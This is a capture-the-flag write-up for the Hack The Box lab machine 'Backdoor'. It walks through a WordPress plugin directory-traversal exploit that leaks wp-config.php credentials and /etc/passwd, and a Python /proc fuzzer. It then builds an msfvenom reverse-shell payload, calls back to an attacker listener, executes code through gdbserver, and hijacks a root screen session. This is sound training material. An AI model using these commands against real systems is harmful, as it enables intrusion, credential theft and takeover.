# Hack The Box Write-up: Backdoor

<img width="898" height="122" alt="image" src="https://github.com/user-attachments/assets/10ad8187-5801-4caf-a8b1-054de11432d9" />

| Attribute | Details |
| :--- | :--- |
| **Machine Name** | Backdoor |
| **IP Address** | 10.10.11.125 |
| **Difficulty** | Easy/Medium |
| **OS** | Linux (Ubuntu) |

## Executive Summary

**Backdoor** is a Linux machine that demonstrates the importance of deep enumeration beyond the initial foothold. While the entry point relies on a known Directory Traversal vulnerability in a WordPress plugin, the critical pivot involves leveraging this Local File Inclusion (LFI) to inspect the `/proc` filesystem. This enumeration reveals a hidden `gdbserver` instance, allowing for Remote Code Execution (RCE). Privilege escalation is achieved by hijacking an insecurely configured `screen` session running as root.

---

## Reconnaissance

### I began with an Nmap scan to identify open ports and services

```
nmap -p- -sVC -vv -oN nmap_scan --min-rate=5000 10.10.11.125
```

<img width="945" height="550" alt="image" src="https://github.com/user-attachments/assets/47b2e5ad-98f3-44e0-991c-ef001bc91f5a" />

Open Ports:
> - `22` (SSH): OpenSSH 8.2p1
> - `80` (HTTP): Apache (WordPress 5.8.1)
> - `1337` (Discovered later via process enumeration)


### I also performed a UDP scan to ensure no services were missed.

```
nmap -p- -sU -Pn -vv -oN nmap_scan_UDP --min-rate=5000 10.10.11.125
```

<img width="941" height="220" alt="image" src="https://github.com/user-attachments/assets/1bc5ce47-9ca9-46e5-bfb0-de4347e8731f" />


# Web Enumeration

## Accessing port 80 revealed a standard WordPress installation

<img width="953" height="936" alt="image" src="https://github.com/user-attachments/assets/458caf3d-41a7-4342-b15c-c7a4b5876a1f" />

### I utilized wpscan to identify potential vulnerabilities and enumerate plugins

```
wpscan --url http://10.10.11.125/ --api-token <API_WP> -e
```

<img width="933" height="960" alt="image" src="https://github.com/user-attachments/assets/6281d1d6-044d-4bb3-a517-85715c4964b5" />

<img width="192" height="50" alt="image" src="https://github.com/user-attachments/assets/2ec92bd3-ea13-4538-94aa-e4dc54c63748" />



### The initial scan reported several Core vulnerabilities (e.g., SQL Injection CVE-2022-21661), but these appeared to be false positives or unexploitable in this context. To dig deeper, I ran an aggressive plugin detection scan.

```
wpscan --url http://10.10.11.125/ --api-token <API_WP> -e ap --plugins-detection aggressive
```


## The scan successfully identified the ebook-download plugin (version 1.1) and akismet.

```bash
[+] akismet
 | Location: http://10.10.11.125/wp-content/plugins/akismet/
 | Latest Version: 5.6
 | Last Updated: 2025-11-12T16:31:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.11.125/wp-content/plugins/akismet/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.1.5
 |     References:
 |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357
 |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
 |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
 |
 | The version could not be determined.

[+] ebook-download
 | Location: http://10.10.11.125/wp-content/plugins/ebook-download/
 | Last Updated: 2020-03-12T12:52:00.000Z
 | Readme: http://10.10.11.125/wp-content/plugins/ebook-download/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.11.125/wp-content/plugins/ebook-download/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Ebook Download < 1.2 - Directory Traversal
 |     Fixed in: 1.2
 |     References:
 |      - https://wpscan.com/vulnerability/13d5d17a-00a8-441e-bda1-2fd2b4158a6c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10924
 |
 | Version: 1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.11.125/wp-content/plugins/ebook-download/readme.txt

```

## I prioritized the ebook-download plugin vulnerability. A Directory Traversal (LFI) is often a more direct path to compromise than the stored XSS found in Akismet.
### Reference: Exploit-DB 39575

<img width="1081" height="273" alt="image" src="https://github.com/user-attachments/assets/471e2cf0-2f9b-460f-8af3-88176357ec80" />


## I verified the vulnerability by attempting to read critical system files.

```
curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```

### I successfully retrieved wp-config.php, which contained database credentials:

-> User: wordpressuser

 -> Password: MQYBJSaD#DxG6qbm

<img width="621" height="312" alt="image" src="https://github.com/user-attachments/assets/900b9f02-98b9-40a6-b97f-b98264e36791" />

## However, these credentials did not grant access to the /wp-admin dashboard or SSH.

<img width="530" height="531" alt="image" src="https://github.com/user-attachments/assets/72486743-5fb1-4aaf-a777-d79d1c983d1e" />

 SSH
 
<img width="315" height="95" alt="image" src="https://github.com/user-attachments/assets/0bd3c4a2-aad4-4ff1-a58c-14a77f14a79a" />

## Next, I read /etc/passwd to identify valid system users.

```
curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../etc/passwd
```

<img width="948" height="663" alt="image" src="https://github.com/user-attachments/assets/69c3708c-144c-4277-9d02-e83c44e26d5c" />

-> Target User: user (UID 1000)

-> Root: root (UID 0)

# Deep Enumeration: Hunting the Backdoor


## Since standard file access didn't yield a shell, I decided to enumerate running processes via the LFI vulnerability. In Linux, process command lines are stored in /proc/[PID]/cmdline.
### I wrote a Python script to fuzz Process IDs (PIDs) from 1 to 1000 to uncover hidden services.

```python
import requests
import sys

url_template = "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../proc/{}/cmdline"
print("[-] Hunting for suspicious processes (PIDs 1-1000)...")
for pid in range(1, 1000):
    try:
        r = requests.get(url_template.format(pid))

        if len(r.content) > 100:

            garbage = f"../../../../../../../../../proc/{pid}/cmdline"
            output = r.text.replace(garbage, "")
            
            output = output.replace("<script>window.close()</script>", "")
            
            clean_cmd = output.replace('\x00', ' ').strip()
            
            if len(clean_cmd) > 0:
                print(f"[+] PID {pid}: {clean_cmd}")
                
    except:
        pass
```

<img width="947" height="957" alt="image" src="https://github.com/user-attachments/assets/363a62e1-4cd9-47c6-aaf4-9071ca7ebc4e" />

## Findings:
### The script revealed two highly suspicious processes:

```
PID 845: /bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
```
#### This indicates a gdbserver listening on port 1337. This is the "Backdoor".
```
PID 844: /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
```
#### This indicates a persistent screen session running as root


# Exploitation: GDBServer RCE

## Gdbserver allows for remote debugging. Since it is listening on 0.0.0.0 (all interfaces) without authentication, it is vulnerable to Remote Code Execution (RCE).

### I verified the port was open:

```
nmap -p 1337 10.10.11.125
```

<img width="579" height="171" alt="image" src="https://github.com/user-attachments/assets/a54c697f-c672-4c26-9708-efaf8136b25a" />

```python
Attack Strategy

Create a malicious ELF binary (Reverse Shell).
Connect to the remote gdbserver using a local GDB client.
Upload the binary to the target.
Force the remote process to execute the binary.
```

## Generate Payload:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.59 LPORT=4444 -f elf -o rev.elf
```

## Start Listener:

```
nc -lvnp 4444
```

## Run Exploit:

```
->  gdb -q rev.elf
->  target extended-remote 10.10.11.125:1337
->  remote put rev.elf /tmp/rev.elf
->  set remote exec-file /tmp/rev.elf
->  run
```

## User

<img width="913" height="540" alt="image" src="https://github.com/user-attachments/assets/eaca6781-4d37-4885-a091-64042460b499" />

## I successfully received a shell as user.

<img width="514" height="175" alt="image" src="https://github.com/user-attachments/assets/802bba1d-01a8-4b26-a87b-cb7ef869722e" />

# User Flag:

```
cat /home/user/user.txt
```

<img width="374" height="287" alt="image" src="https://github.com/user-attachments/assets/c193a3bf-3c0c-4a27-ad70-14ede962f808" />

# Root

## Reviewing the process list from my earlier enumeration, I investigated PID 844:

```sh
/bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
```

#### The screen utility allows for terminal multiplexing. On this machine, the configuration (likely in .screenrc or global settings) allows for multi-user access or has weak permissions on the socket file.

### I attempted to hijack the root session directly from the user account:

```
screen -x root/root
```

## Result: The command succeeded, instantly dropping me into a root shell

<img width="324" height="122" alt="image" src="https://github.com/user-attachments/assets/bb492e7e-3278-4ed7-a886-38a8eb9fc2c7" />







